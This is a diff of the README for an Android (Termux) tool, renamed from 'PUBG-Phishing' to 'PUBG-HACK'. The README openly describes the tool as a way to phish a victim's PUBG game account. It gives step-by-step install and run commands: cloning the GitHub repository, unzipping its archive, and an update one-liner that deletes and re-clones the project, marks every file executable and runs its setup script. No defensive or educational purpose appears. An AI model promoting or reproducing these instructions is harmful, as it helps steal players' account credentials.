@@ -1,6 +1,6 @@
 ## ABOUT TOOL :
 
-PUBG-PHISING IS A PHISING TOOL WICH IS USED TO PHISH A PUBG ACCOUNT OF YOUR VICTIM. This tool works on both rooted Android device and Non-rooted Android device.
+PUBG-HACK IS A PHISING TOOL WICH IS USED TO PHISH A PUBG ACCOUNT OF YOUR VICTIM. This tool works on both rooted Android device and Non-rooted Android device.
 
 ### AVAILABLE ON :
 
@@ -39,10 +39,10 @@ pkg upgrade -y
 pkg install git 
 ```
 ```
-git clone https://github.com/legend-and-criminal-boyz/PUBG-Phishing
+git clone https://github.com/legend-and-criminal-boyz/PUBG-HACK
 ```
 ```
-cd PUBG-Phishing
+cd PUBG-HACK
 ```
 ```
 unzip PUBG.zip
@@ -60,7 +60,7 @@ Now Type onlinehacking-pubg Run Tool
 
 ### ♻ Update Tool Command 
 ```
-$ rm -rf PUBG-Phishing && git clone https://github.com/legend-and-criminal-boyz/PUBG-Phishing && cd PUBG-Phishing && chmod +x * && ./setup 
+$ rm -rf PUBG-HACK && git clone https://github.com/legend-and-criminal-boyz/PUBG-HACK && cd PUBG-HACK && chmod +x * && ./setup 
 ```
 
 
